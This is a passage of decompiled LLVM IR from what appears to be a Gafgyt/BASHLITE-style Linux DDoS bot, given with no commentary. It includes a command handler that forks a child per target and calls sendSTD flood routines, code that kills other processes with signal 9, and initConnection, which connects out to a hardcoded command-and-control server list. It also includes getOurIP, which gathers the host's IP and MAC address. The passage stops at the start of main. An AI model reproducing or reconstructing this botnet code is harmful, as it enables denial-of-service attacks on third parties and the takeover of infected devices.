  %v5_804c712 = icmp ult i32 %v0_804c712, 8
  store i1 %v5_804c712, i1* %cf.global-to-local, align 1
  %v2_804c71b = call i32 @Rootsprintf(i32 %v0_804c70d, i32 ptrtoint ([27 x i8]* @global_var_80566a2.163 to i32))
  %v0_804c720 = load i32, i32* @esp, align 4
  %v2_804c720 = icmp ugt i32 %v0_804c720, -17
  store i1 %v2_804c720, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c90d

dec_label_pc_804c728:                             ; preds = %dec_label_pc_804c6f5
  %v1_804c72b = add i32 %tmp134, 4
  %v1_804c72e = inttoptr i32 %v1_804c72b to i32*
  %v2_804c72e = load i32, i32* %v1_804c72e, align 4
  %v2_804c739 = load i32, i32* %v1_804c6e3, align 4
  store i1 %v5_804c6fd, i1* %cf.global-to-local, align 1
  %v1_804c73f = call i32 @atol(i32 %v2_804c739)
  %v2_804c750 = load i32, i32* %v1_804c6fb, align 4
  store i1 %v5_804c6fd, i1* %cf.global-to-local, align 1
  %v1_804c756 = call i32 @atol(i32 %v2_804c750)
  %v5_804c764 = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c764, i1* %cf.global-to-local, align 1
  %v2_804c76a = inttoptr i32 %v2_804c72e to i8*
  %v3_804c76a = call i32 @__GI_strchr(i8* %v2_804c76a, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c772 = icmp eq i32 %v3_804c76a, 0
  br i1 %v1_804c772, label %dec_label_pc_804c7d3, label %dec_label_pc_804c776

dec_label_pc_804c776:                             ; preds = %dec_label_pc_804c728
  store i32 %v2_804c72e, i32* @eax, align 4
  store i1 %v5_804c764, i1* %cf.global-to-local, align 1
  %v2_804c782 = call i32 @__GI_strtok(i32 %v2_804c72e, i32 ptrtoint (i32* @global_var_80564f1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c7cb176 = icmp eq i32 %v2_804c782, 0
  %v1_804c7cf177 = icmp eq i1 %v4_804c7cb176, false
  br i1 %v1_804c7cf177, label %dec_label_pc_804c78f, label %dec_label_pc_804c7fe

dec_label_pc_804c78f:                             ; preds = %dec_label_pc_804c776, %dec_label_pc_804c7b6
  %storemerge71178 = phi i32 [ %v2_804c7c0, %dec_label_pc_804c7b6 ], [ %v2_804c782, %dec_label_pc_804c776 ]
  %v0_804c78f = call i32 @listFork()
  store i32 %v0_804c78f, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c794 = icmp eq i32 %v0_804c78f, 0
  %v1_804c796 = icmp eq i1 %v1_804c794, false
  %v0_804c7b6 = load i32, i32* @esp, align 4
  br i1 %v1_804c796, label %dec_label_pc_804c7b6, label %dec_label_pc_804c798

dec_label_pc_804c798:                             ; preds = %dec_label_pc_804c78f
  %v5_804c798 = icmp ult i32 %v0_804c7b6, 4
  store i1 %v5_804c798, i1* %cf.global-to-local, align 1
  %v3_804c7a4 = trunc i32 %v1_804c73f to i16
  %v4_804c7a4 = call i32 @sendSTD(i32 %storemerge71178, i16 %v3_804c7a4, i32 %v1_804c756)
  store i1 %v5_804c6fd, i1* %cf.global-to-local, align 1
  %v1_804c7b1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c7b6:                             ; preds = %dec_label_pc_804c78f
  %v5_804c7b6 = icmp ult i32 %v0_804c7b6, 8
  store i1 %v5_804c7b6, i1* %cf.global-to-local, align 1
  %v2_804c7c0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80564f1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c7cb = icmp eq i32 %v2_804c7c0, 0
  %v1_804c7cf = icmp eq i1 %v4_804c7cb, false
  br i1 %v1_804c7cf, label %dec_label_pc_804c78f, label %dec_label_pc_804c7fe

dec_label_pc_804c7d3:                             ; preds = %dec_label_pc_804c728
  %v0_804c7d3 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c7d8 = icmp eq i32 %v0_804c7d3, 0
  %v1_804c7da = icmp eq i1 %v1_804c7d8, false
  br i1 %v1_804c7da, label %dec_label_pc_804c90d, label %dec_label_pc_804c7e0

dec_label_pc_804c7e0:                             ; preds = %dec_label_pc_804c7d3
  %v0_804c7e0 = load i32, i32* @esp, align 4
  %v5_804c7e0 = icmp ult i32 %v0_804c7e0, 4
  store i1 %v5_804c7e0, i1* %cf.global-to-local, align 1
  %v3_804c7ec = trunc i32 %v1_804c73f to i16
  %v4_804c7ec = call i32 @sendSTD(i32 %v2_804c72e, i16 %v3_804c7ec, i32 %v1_804c756)
  store i1 %v5_804c6fd, i1* %cf.global-to-local, align 1
  %v1_804c7f9 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c7fe:                             ; preds = %dec_label_pc_804c776, %dec_label_pc_804c7b6, %dec_label_pc_804c68c
  %v2_804c801 = load i32, i32* %v1_804bdad, align 4
  store i1 false, i1* @df, align 1
  %v4_804c81e = inttoptr i32 %v2_804c801 to i8*
  %v7_804c830 = call i32 @_strncmp(i8* %v4_804c81e, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80566bd.164, i32 0, i32 0), i32 5)
  %v8_804c830 = urem i32 %v7_804c830, 2
  %v9_804c830 = icmp eq i32 %v8_804c830, 0
  %v0_804c832 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c832 = or i1 %v0_804c832, %v9_804c830
  %v3_804c832 = zext i1 %v2_804c832 to i32
  %v4_804c832 = load i32, i32* @edx, align 4
  %v5_804c832 = and i32 %v4_804c832, -256
  %v6_804c832 = or i32 %v3_804c832, %v5_804c832
  %v7_804c832 = xor i32 %v6_804c832, 1
  store i32 %v7_804c832, i32* %edx.global-to-local, align 4
  %v1_804c83a = trunc i32 %v7_804c832 to i8
  %v3_804c83a = zext i1 %v0_804c832 to i8
  %v4_804c83a = sub nsw i8 %v1_804c83a, %v3_804c83a
  %v15_804c83a = icmp eq i8 %v4_804c83a, 0
  %v2_804c83e = sext i8 %v4_804c83a to i32
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c843 = icmp eq i1 %v15_804c83a, false
  br i1 %v1_804c843, label %dec_label_pc_804c90d, label %dec_label_pc_804c8b0.preheader

dec_label_pc_804c8b0.preheader:                   ; preds = %dec_label_pc_804c7fe
  br label %dec_label_pc_804c8b0

dec_label_pc_804c859:                             ; preds = %dec_label_pc_804c8ed, %dec_label_pc_804c8b0
  %v2_804c85c = mul i32 %storemerge19, 4
  store i32 %v2_804c85c, i32* %edx.global-to-local, align 4
  %v0_804c861 = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804c866 = add i32 %v0_804c861, %v2_804c85c
  %v1_804c869 = inttoptr i32 %v2_804c866 to i32*
  %v2_804c869 = load i32, i32* %v1_804c869, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c86b = icmp eq i32 %v2_804c869, 0
  br i1 %v1_804c86b, label %dec_label_pc_804c8ad, label %dec_label_pc_804c86f

dec_label_pc_804c86f:                             ; preds = %dec_label_pc_804c859
  %v9_804c85c = and i32 %storemerge19, 1073741824
  %v10_804c85c = icmp ne i32 %v9_804c85c, 0
  store i1 %v10_804c85c, i1* %cf.global-to-local, align 1
  store i32 %v2_804c85c, i32* %edx.global-to-local, align 4
  %v2_804c87f = load i32, i32* %v1_804c869, align 4
  store i32 %v2_804c87f, i32* @ebx, align 4
  %v0_804c881 = call i32 @__libc_getpid()
  %v0_804c886 = load i32, i32* @ebx, align 4
  %v7_804c886 = icmp ult i32 %v0_804c886, %v0_804c881
  store i1 %v7_804c886, i1* %cf.global-to-local, align 1
  %v12_804c886 = icmp eq i32 %v0_804c886, %v0_804c881
  br i1 %v12_804c886, label %dec_label_pc_804c8ad, label %dec_label_pc_804c88a

dec_label_pc_804c88a:                             ; preds = %dec_label_pc_804c86f
  store i32 %v2_804c85c, i32* %edx.global-to-local, align 4
  %v0_804c892 = load i32, i32* @global_var_805fd94.34, align 4
  %v2_804c897 = add i32 %v0_804c892, %v2_804c85c
  %v1_804c89a = inttoptr i32 %v2_804c897 to i32*
  %v2_804c89a = load i32, i32* %v1_804c89a, align 4
  %v0_804c89c = load i32, i32* @esp, align 4
  %v5_804c89c = icmp ult i32 %v0_804c89c, 8
  store i1 %v5_804c89c, i1* %cf.global-to-local, align 1
  %v3_804c8a2 = call i32 @kill(i32 %v2_804c89a, i32 9)
  %v0_804c8a7 = load i32, i32* @esp, align 4
  %v2_804c8a7 = icmp ugt i32 %v0_804c8a7, -17
  store i1 %v2_804c8a7, i1* %cf.global-to-local, align 1
  %v4_804c8aa = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804c8ad

dec_label_pc_804c8ad:                             ; preds = %dec_label_pc_804c86f, %dec_label_pc_804c859, %dec_label_pc_804c88a
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804c859 ], [ %stack_var_-28.1, %dec_label_pc_804c86f ], [ %v4_804c8aa, %dec_label_pc_804c88a ]
  %v4_804c8ad = add i32 %storemerge19, 1
  br label %dec_label_pc_804c8b0

dec_label_pc_804c8b0:                             ; preds = %dec_label_pc_804c8b0.preheader, %dec_label_pc_804c8ad
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804c8ad ], [ 0, %dec_label_pc_804c8b0.preheader ]
  %storemerge19 = phi i32 [ %v4_804c8ad, %dec_label_pc_804c8ad ], [ 0, %dec_label_pc_804c8b0.preheader ]
  %v0_804c8c4 = load i32, i32* @global_var_8059b08.32, align 8
  %v0_804c8c9 = load i32, i32* @global_var_8059b0c.33, align 4
  store i32 %v0_804c8c9, i32* %edx.global-to-local, align 4
  %v10_804c8e1 = icmp ne i32 %v0_804c8c9, 0
  store i1 %v10_804c8e1, i1* %cf.global-to-local, align 1
  br i1 %v10_804c8e1, label %dec_label_pc_804c859, label %dec_label_pc_804c8ed

dec_label_pc_804c8ed:                             ; preds = %dec_label_pc_804c8b0
  %v10_804c901 = icmp ult i32 %storemerge19, %v0_804c8c4
  store i1 %v10_804c901, i1* %cf.global-to-local, align 1
  br i1 %v10_804c901, label %dec_label_pc_804c859, label %dec_label_pc_804c90d

dec_label_pc_804c90d:                             ; preds = %dec_label_pc_804c35f, %dec_label_pc_804c3ab, %dec_label_pc_804c8ed, %dec_label_pc_804bff7, %dec_label_pc_804bfd1, %dec_label_pc_804c3cb, %dec_label_pc_804c014, %dec_label_pc_804bfdb, %dec_label_pc_804bf2b, %dec_label_pc_804bea1, %dec_label_pc_804c7fe, %dec_label_pc_804c7d3, %dec_label_pc_804c4fb, %dec_label_pc_804c229, %dec_label_pc_804bf54, %dec_label_pc_804bdf1, %dec_label_pc_804c70d
  %v0_804c914 = phi i32 [ %v1_804c003, %dec_label_pc_804bff7 ], [ %v2_804bfc6, %dec_label_pc_804bfd1 ], [ %v0_804c3cb, %dec_label_pc_804c3cb ], [ %v0_804c014, %dec_label_pc_804c014 ], [ %v1_804bfe7, %dec_label_pc_804bfdb ], [ %v0_804bf2b, %dec_label_pc_804bf2b ], [ 0, %dec_label_pc_804bea1 ], [ %v2_804c83e, %dec_label_pc_804c7fe ], [ %v0_804c7d3, %dec_label_pc_804c7d3 ], [ %v2_804c509, %dec_label_pc_804c4fb ], [ %v2_804c237, %dec_label_pc_804c229 ], [ %v1_804bf38, %dec_label_pc_804bf54 ], [ %v2_804bdff, %dec_label_pc_804bdf1 ], [ %v2_804c71b, %dec_label_pc_804c70d ], [ %v0_804c8c4, %dec_label_pc_804c8ed ], [ %v2_804c36b, %dec_label_pc_804c35f ], [ %v2_804c3b5, %dec_label_pc_804c3ab ]
  %v2_804c910 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c910, i32* @ebx, align 4
  store i32 %v0_804bda2, i32* @esi, align 4
  store i32 %v0_804bda1, i32* @edi, align 4
  ret i32 %v0_804c914

; uselistorder directives
  uselistorder i32 %storemerge19, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804c85c, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804c832, { 1, 0 }
  uselistorder i32 %v2_804c7c0, { 1, 0 }
  uselistorder i32 %v0_804c7b6, { 1, 0 }
  uselistorder i32 %v2_804c72e, { 3, 0, 2, 1 }
  uselistorder i1 %v5_804c6fd, { 1, 0, 4, 3, 2 }
  uselistorder i1 %v0_804c6c0, { 1, 0 }
  uselistorder i32 %v2_804c646, { 1, 0 }
  uselistorder i32 %v0_804c63c, { 1, 0 }
  uselistorder i1 %v5_804c5de, { 1, 0 }
  uselistorder i32 %v2_804c51c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804c4ba, { 1, 0 }
  uselistorder i32 %v1_804c4b2, { 0, 3, 1, 2 }
  uselistorder i1 %v5_804c47c, { 1, 0, 11, 8, 7, 6, 10, 9, 5, 4, 3, 2 }
  uselistorder i1 %v0_804c436, { 1, 0 }
  uselistorder i32 %v2_804c3b5, { 0, 2, 1 }
  uselistorder i1 %v5_804c34d, { 1, 0 }
  uselistorder i32 %v1_804c2f2, { 2, 1, 0 }
  uselistorder i32 %v1_804c2bd, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804c24a, { 3, 0, 2, 1 }
  uselistorder i1 %v8_804c20b, { 1, 0, 2 }
  uselistorder i32 %v1_804c206, { 1, 0 }
  uselistorder i32 %v1_804c1fe, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804c1eb, { 1, 0 }
  uselistorder i32 %v1_804c1e3, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804c1d0, { 1, 0 }
  uselistorder i32 %v1_804c1c8, { 0, 3, 1, 2 }
  uselistorder i1 %v5_804c171, { 1, 0, 15, 14, 12, 11, 10, 9, 13, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i1 %v0_804c12b, { 1, 0 }
  uselistorder i1 %v5_804c063, { 1, 0 }
  uselistorder i1 %v5_804bfff, { 0, 5, 4, 3, 2, 1 }
  uselistorder i1 %v0_804bfba, { 1, 0 }
  uselistorder i1 %v0_804bf18, { 1, 0 }
  uselistorder i1 %v0_804be8e, { 1, 0 }
  uselistorder i1 %v0_804be40, { 1, 0 }
  uselistorder i1 %v0_804bdde, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-284, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder i32 %tmp134, { 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 2, 0 }
  uselistorder i32 %tmp115, { 2, 14, 0, 13, 3, 4, 12, 5, 6, 1, 11, 7, 10, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 13, 10, 11, 12, 14, 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i1* %cf.global-to-local, { 115, 121, 116, 117, 118, 119, 120, 122, 143, 123, 124, 125, 130, 126, 127, 128, 129, 1, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 147, 145, 146, 148, 3, 149, 150, 151, 152, 113, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 74, 34, 35, 39, 36, 37, 38, 2, 40, 41, 42, 43, 44, 45, 46, 112, 47, 48, 114, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 104, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 105, 108, 106, 107, 109, 110, 111 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80564f1.143 to i32), { 4, 0, 3, 1, 5, 2, 6, 7 }
  uselistorder label %dec_label_pc_804c90d, { 2, 10, 11, 16, 12, 5, 1, 0, 13, 6, 3, 7, 4, 14, 8, 9, 15 }
  uselistorder label %dec_label_pc_804c8b0, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c7fe, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c78f, { 1, 0 }
  uselistorder label %dec_label_pc_804c70d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c68c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804c609, { 1, 0 }
  uselistorder label %dec_label_pc_804c5d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c59d, { 1, 0 }
  uselistorder label %dec_label_pc_804c516, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c4fb, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804c378, { 1, 0 }
  uselistorder label %dec_label_pc_804c341, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c229, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804c0f7, { 1, 0 }
  uselistorder label %dec_label_pc_804bee1, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %v2_804c91e = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804c932 = bitcast i32* %stack_var_-4104 to i8*
  %v4_804c932 = call i32 @__GI_memset(i8* %v3_804c932, i32 0, i32 4096)
  %v0_804c93a = load i32, i32* @global_var_8059b00.18, align 256
  %v1_804c93f = icmp eq i32 %v0_804c93a, 0
  br i1 %v1_804c93f, label %dec_label_pc_804c95e, label %dec_label_pc_804c943

dec_label_pc_804c943:                             ; preds = %entry
  %v1_804c94c = call i32 @__libc_close(i32 %v0_804c93a)
  store i32 0, i32* @global_var_8059b00.18, align 256
  br label %dec_label_pc_804c95e

dec_label_pc_804c95e:                             ; preds = %entry, %dec_label_pc_804c943
  %v0_804c95e = load i32, i32* @global_var_8059798.165, align 8
  %v1_804c963 = icmp eq i32 %v0_804c95e, 0
  %v1_804c965 = icmp eq i1 %v1_804c963, false
  br i1 %v1_804c965, label %dec_label_pc_804c973, label %dec_label_pc_804c97e

dec_label_pc_804c973:                             ; preds = %dec_label_pc_804c95e
  %v1_804c978 = add i32 %v0_804c95e, 1
  br label %dec_label_pc_804c97e

dec_label_pc_804c97e:                             ; preds = %dec_label_pc_804c95e, %dec_label_pc_804c973
  %storemerge = phi i32 [ %v1_804c978, %dec_label_pc_804c973 ], [ 0, %dec_label_pc_804c95e ]
  store i32 %storemerge, i32* @global_var_8059798.165, align 8
  %v1_804c983 = mul i32 %storemerge, 4
  %v2_804c983 = add i32 %v1_804c983, ptrtoint ([20 x i8]** @global_var_8059210.166 to i32)
  %v3_804c983 = inttoptr i32 %v2_804c983 to i32*
  %v4_804c983 = load i32, i32* %v3_804c983, align 4
  store i32 %v4_804c983, i32* @eax, align 4
  %v3_804c995 = call i32 @strcpy(i8* %v3_804c932, i32 %v4_804c983)
  %v3_804c9b0 = call i32 @__GI_strchr(i8* %v3_804c932, i32 58)
  %v1_804c9b8 = icmp eq i32 %v3_804c9b0, 0
  br i1 %v1_804c9b8, label %dec_label_pc_804c9f7, label %dec_label_pc_804c9bc

dec_label_pc_804c9bc:                             ; preds = %dec_label_pc_804c97e
  %v3_804c9c8 = call i32 @__GI_strchr(i8* %v3_804c932, i32 58)
  %v1_804c9d0 = add i32 %v3_804c9c8, 1
  %v1_804c9d5 = call i32 @atol(i32 %v1_804c9d0)
  %v3_804c9ec = call i32 @__GI_strchr(i8* %v3_804c932, i32 58)
  %v4_804c9ec = inttoptr i32 %v3_804c9ec to i8*
  store i8 0, i8* %v4_804c9ec, align 1
  br label %dec_label_pc_804c9f7

dec_label_pc_804c9f7:                             ; preds = %dec_label_pc_804c97e, %dec_label_pc_804c9bc
  %stack_var_-8.0 = phi i32 [ 123, %dec_label_pc_804c97e ], [ %v1_804c9d5, %dec_label_pc_804c9bc ]
  %v3_804ca00 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804ca00, i32* @global_var_8059b00.18, align 256
  %v4_804ca20 = call i32 @connectTimeout(i32 %v3_804ca00, i32 %v2_804c91e, i32 %stack_var_-8.0, i32 30)
  %v1_804ca28 = icmp eq i32 %v4_804ca20, 0
  %. = zext i1 %v1_804ca28 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 37, 3, 2, 1, 0, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c9f7, { 1, 0 }
  uselistorder label %dec_label_pc_804c97e, { 1, 0 }
  uselistorder label %dec_label_pc_804c95e, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804ca5c = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804ca67 = icmp eq i32 %v5_804ca5c, -1
  %v1_804ca6b = icmp eq i1 %v13_804ca67, false
  br i1 %v1_804ca6b, label %dec_label_pc_804ca7c, label %dec_label_pc_804cc3f

dec_label_pc_804ca7c:                             ; preds = %entry
  %v2_804ca7c = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804caa8 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_80566c2.167 to i32))
  %v2_804cab8 = call i32 @htons(i32 53)
  %v5_804cad0 = call i32 @__libc_connect(i32 %v5_804ca5c, i32 %v2_804ca7c, i32 16)
  %v13_804cadb = icmp eq i32 %v5_804cad0, -1
  %v1_804cadf = icmp eq i1 %v13_804cadb, false
  br i1 %v1_804cadf, label %dec_label_pc_804caf0, label %dec_label_pc_804cc3f

dec_label_pc_804caf0:                             ; preds = %dec_label_pc_804ca7c
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804caf7 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804cafd = ptrtoint i32* %stack_var_-60 to i32
  %v5_804cb05 = call i32 @__GI_getsockname(i32 %v5_804ca5c, i32 %v2_804caf7, i32 %v2_804cafd)
  %v13_804cb10 = icmp eq i32 %v5_804cb05, -1
  %v1_804cb14 = icmp eq i1 %v13_804cb10, false
  br i1 %v1_804cb14, label %dec_label_pc_804cb25, label %dec_label_pc_804cc3f

dec_label_pc_804cb25:                             ; preds = %dec_label_pc_804caf0
  %v5_804cb37 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80566ca.168, i32 0, i32 0), i32 0)
  %v2_804cb9a = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804cbac51 = call i32 @fdgets(i32 %v2_804cb9a, i32 4096, i32 %v5_804cb37)
  %v1_804cbb452 = icmp eq i32 %v5_804cbac51, 0
  %v1_804cbb653 = icmp eq i1 %v1_804cbb452, false
  br i1 %v1_804cbb653, label %dec_label_pc_804cb44, label %dec_label_pc_804cbb8

dec_label_pc_804cb44:                             ; preds = %dec_label_pc_804cb25, %dec_label_pc_804cb7e
  %v5_804cb53 = call i32 @strstr(i32 %v2_804cb9a, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80566da.169, i32 0, i32 0))
  %v1_804cb5b = icmp eq i32 %v5_804cb53, 0
  br i1 %v1_804cb5b, label %dec_label_pc_804cb7e, label %dec_label_pc_804cb6d.preheader

dec_label_pc_804cb6d.preheader:                   ; preds = %dec_label_pc_804cb44
  %v2_804cb7042 = load i8, i8* %stack_var_-4156, align 1
  %v10_804cb7247 = icmp eq i8 %v2_804cb7042, 9
  %v1_804cb7448 = icmp eq i1 %v10_804cb7247, false
  br i1 %v1_804cb7448, label %dec_label_pc_804cb6a, label %dec_label_pc_804cb76

dec_label_pc_804cb6a:                             ; preds = %dec_label_pc_804cb6d.preheader, %dec_label_pc_804cb6a
  %v4_804cb6d49 = phi i32 [ %v5_804cb6a, %dec_label_pc_804cb6a ], [ %v2_804cb9a, %dec_label_pc_804cb6d.preheader ]
  %v5_804cb6a = add i32 %v4_804cb6d49, 1
  %v22_804cb6a = inttoptr i32 %v5_804cb6a to i8*
  %v2_804cb70 = load i8, i8* %v22_804cb6a, align 1
  %v10_804cb72 = icmp eq i8 %v2_804cb70, 9
  %v1_804cb74 = icmp eq i1 %v10_804cb72, false
  br i1 %v1_804cb74, label %dec_label_pc_804cb6a, label %dec_label_pc_804cb76

dec_label_pc_804cb76:                             ; preds = %dec_label_pc_804cb6a, %dec_label_pc_804cb6d.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804cb6d.preheader ], [ %v22_804cb6a, %dec_label_pc_804cb6a ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_804cbb8

dec_label_pc_804cb7e:                             ; preds = %dec_label_pc_804cb44
  %v6_804cb92 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804cbac = call i32 @fdgets(i32 %v2_804cb9a, i32 4096, i32 %v5_804cb37)
  %v1_804cbb4 = icmp eq i32 %v5_804cbac, 0
  %v1_804cbb6 = icmp eq i1 %v1_804cbb4, false
  br i1 %v1_804cbb6, label %dec_label_pc_804cb44, label %dec_label_pc_804cbb8

dec_label_pc_804cbb8:                             ; preds = %dec_label_pc_804cb25, %dec_label_pc_804cb7e, %dec_label_pc_804cb76
  %v2_804cbbe = call i32 @__libc_close(i32 %v5_804cb37)
  %v3_804cbc6 = load i8, i8* %stack_var_-4156, align 1
  %v4_804cbcc = icmp eq i8 %v3_804cbc6, 0
  br i1 %v4_804cbcc, label %dec_label_pc_804cc2f, label %dec_label_pc_804cbd0

dec_label_pc_804cbd0:                             ; preds = %dec_label_pc_804cbb8
  %v2_804cbda = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804cbda, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804cbe1 = call i32 @strcpy(i8* %tmp39, i32 %v2_804cb9a)
  %v5_804cbfb = call i32 @ioctl(i32 %v5_804ca5c, i32 35111, i32 %v2_804cbda)
  %v2_804cc15 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804cc0c

dec_label_pc_804cc0c:                             ; preds = %dec_label_pc_804cbd0, %dec_label_pc_804cc0c
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804cbd0 ], [ %v4_804cc26, %dec_label_pc_804cc0c ]
  %v2_804cc1b = add i32 %storemerge40, %v2_804cc15
  %v1_804cc1e = inttoptr i32 %v2_804cc1b to i8*
  %v2_804cc1e = load i8, i8* %v1_804cc1e, align 1
  %v3_804cc20 = add i32 %storemerge40, ptrtoint (i8** @global_var_8059b10.170 to i32)
  %v4_804cc20 = inttoptr i32 %v3_804cc20 to i8*
  store i8 %v2_804cc1e, i8* %v4_804cc20, align 1
  %v4_804cc26 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804cc26, 6
  br i1 %exitcond, label %dec_label_pc_804cc2f.loopexit, label %dec_label_pc_804cc0c

dec_label_pc_804cc2f.loopexit:                    ; preds = %dec_label_pc_804cc0c
  br label %dec_label_pc_804cc2f

dec_label_pc_804cc2f:                             ; preds = %dec_label_pc_804cc2f.loopexit, %dec_label_pc_804cbb8
  %v2_804cc35 = call i32 @__libc_close(i32 %v5_804ca5c)
  %v3_804cc4b.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804cc4b

dec_label_pc_804cc3f:                             ; preds = %dec_label_pc_804caf0, %dec_label_pc_804ca7c, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804cc4b

dec_label_pc_804cc4b:                             ; preds = %dec_label_pc_804cc2f, %dec_label_pc_804cc3f
  %v3_804cc4b = phi i32 [ %v3_804cc4b.pre, %dec_label_pc_804cc2f ], [ 0, %dec_label_pc_804cc3f ]
  ret i32 %v3_804cc4b

; uselistorder directives
  uselistorder i32 %v5_804cb6a, { 1, 0 }
  uselistorder i32 %v2_804cb9a, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804cb37, { 2, 1, 0 }
  uselistorder i32 %v5_804ca5c, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cc4b, { 1, 0 }
  uselistorder label %dec_label_pc_804cc0c, { 1, 0 }
  uselistorder label %dec_label_pc_804cbb8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cb6a, { 1, 0 }
  uselistorder label %dec_label_pc_804cb44, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_80566e5.171 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
